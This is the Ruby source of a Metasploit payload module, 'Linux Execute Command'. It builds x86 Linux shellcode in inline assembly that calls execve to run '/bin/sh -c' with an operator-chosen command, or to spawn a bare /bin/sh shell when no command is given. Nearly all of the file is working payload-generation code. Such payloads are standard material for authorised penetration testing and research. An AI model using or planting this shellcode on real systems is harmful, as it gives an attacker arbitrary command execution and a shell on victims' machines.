##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module MetasploitModule

  CachedSize = 43

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => 'Execute an arbitrary command or just a /bin/sh shell',
      'Author'        => ['vlad902',
                          'Geyslan G. Bem <geyslan[at]gmail.com>'],
      'License'       => MSF_LICENSE,
      'References'    => [ ['URL', 'https://github.com/geyslan/SLAE/blob/master/4th.assignment/tiny_execve_sh.asm'] ],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86
    ))

    # Register exec options
    register_options(
      [
        OptString.new('CMD',  [ false,  "The command string to execute" ]),
      ])
  end

  def generate_stage(opts={})
    cmd = datastore['CMD'] || ''
    if !cmd.empty?
      #
      # Dynamically builds the exec payload based on the user's options.
      #
      payload = <<-EOS
          push 0xb
          pop eax
          cdq
          push edx
          ; pushw 0x632d   ; (metasm doesn't support pushw)
          dd 0x632d6866    ; "-c"
          mov edi, esp
          push 0x0068732f  ; "/sh\0"
          push 0x6e69622f  ; "/bin"
          mov ebx, esp
          push edx
          call continue
          db "#{cmd}", 0x00
        continue:
          push edi
          push ebx
          mov ecx, esp
          int 0x80
      EOS
    else
      #
      # execve("/bin/sh", NULL, NULL) - 20 bytes (not null-free)
      #
      payload = <<-EOS
          xor ecx, ecx	   ; ecx = NULL
          mul ecx		       ; eax and edx = NULL
          mov al, 0xb	     ; execve syscall
          push 0x0068732f  ; "/sh\0"
          push 0x6e69622f	 ; "/bin"
          mov ebx, esp	   ; pointer to "/bin/sh\0" cmd
          int 0x80	       ; bingo
      EOS
    end
    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload).encode_string
  end
end
